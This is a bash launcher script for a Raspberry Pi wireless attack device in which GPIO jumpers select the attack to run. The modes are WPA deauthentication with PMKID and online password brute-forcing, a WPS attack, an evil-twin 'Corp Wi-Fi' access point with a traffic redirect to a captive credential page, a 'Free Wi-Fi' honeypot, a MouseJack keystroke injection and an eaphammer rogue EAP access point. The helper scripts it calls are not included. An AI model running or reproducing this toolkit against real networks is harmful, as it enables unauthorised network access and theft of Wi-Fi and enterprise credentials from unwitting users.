#!/usr/bin/env bash
# Define LED control function (assuming pins: green=7, yellow=10, red=11)

function monitor_enable(){
    iw phy0 interface add mon0 type monitor
    ifconfig mon0 up
    ifconfig wlan0 up
}

# Set pull-ups for jumper pins
raspi-gpio set 7 ip pu
raspi-gpio set 10 ip pu
raspi-gpio set 11 ip pu
raspi-gpio set 23 ip pu
raspi-gpio set 25 ip pu
raspi-gpio set 27 ip pu
time=$(date +'%Y-%m-%d %H:%M:%S')


# LED startup blink (ignore errors)
led green on 2>/dev/null
led yellow on 2>/dev/null
sleep 1
led green off 2>/dev/null
led yellow off 2>/dev/null
led red off 2>/dev/null


# Main mode selection
if jmp 7; then
    echo "[*] wpa auth/deauth/online_brute attack (static/dynamic)"
    monitor_enable
    cd /home/pi/wpapsk
    screen -dmS wpapsk -t monitor -L -Logfile "$time-wpapsk-%n.log" ./
    monitor.sh -c 1,6,11
    #screen -r wpapsk -t deauth -X screen ./deauth.sh -b target.txt
    screen -r wpapsk -t brute-wpapsk -X screen ./brute-wpapsk.sh
    screen -r wpapsk -t auth -X screen ./auth.sh
    screen -r wpapsk -t brute-pmkid -X screen ./brute-pmkid.sh
    screen -r wpapsk -t online_brute -X screen ./wpa_brute.sh "Target Wi-Fi" passwords.txt 4
    #screen -r wpapsk -t online_brute -X screen './wpa_brute-width.sh 12345678 123456789 1234567890 password'
    cd -

elif jmp 11; then
    echo "[*] wps attack (static/dynamic)"
    cd /home/pi/wpapsk
    screen -dmS wpapsk -t wps -L -Logfile "$time-wps-%n.log" ./wps.sh "Target Wi-Fi"
    cd -

elif jmp 10; then
    echo "[*] roqueap/eviltwin attack (static)"
    #monitor_enable
    cd /home/pi/eviltwin
    ifconfig wlan0 10.0.0.1/24
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
    screen -dmS eviltwin -t hostapd -L -Logfile "$time-eviltwin-%n.log" ./hostapd.sh "Corp Wi-Fi" ""
    screen -r eviltwin -t dnsmasq -X screen ./dnsmasq.sh
    screen -r eviltwin -t captive -X screen ./captive.sh www/
    #screen -r eviltwin -t deauth -X screen ./deauth.sh -c 1,6,11
    cd -

elif jmp 23; then
    echo "[*] roqueap/honeypot (static)"
    cd /home/pi/honeypot
    ifconfig wlan0 10.0.0.1/24
    screen -dmS honeypot -t hostapd -L -Logfile "$time-honeypot-%n.log" ./hostapd.sh "Free Wi-Fi" ""
    screen -r honeypot -t dnsmasq -X screen ./dnsmasq.sh
    screen -r honeypot -t attack -X screen ./attack.sh
    cd -

elif lsusb | grep -q 'Nordic Semiconductor'; then
    echo "[*] mousejack attack"
    cd /home/pi/mousejack || exit 1
    screen -dmS mousejack -t jackit -L -logfile "$time-mousejack-%n.log" './mousejack.sh'
    cd -

elif jmp 25; then
    echo "[*] roqueap/eap (static)"
    cd /home/pi/eap
    screen -dmS eap -t hostapd-eaphammer -L -Logfile "$time-eap-%n.log" ./hostapd-eaphammer.sh "Target Wi-Fi"
    #screen -r eap -t deauth -X screen ./deauth.sh -c 1,6,11

elif jmp 27; then
    echo "[*] wi-fi recon (dynamic)"
    monitor_enable
    cd /home/pi/recon || exit 1
    screen -dmS recon -t gpsd -L -logfile "$time-recon-%n.log" './gps.sh'
    screen -S recon -X screen -t kismet './kismet.sh'
    screen -S recon -X screen -t tcpdump './tcpdump.sh'
    cd -
else
    echo "No valid mode selected (checked jumpers: 7,10,11,23,25,27 and lsusb)"
    exit 1
fi
echo "Selected mode started. Use 'screen -ls' to check sessions."
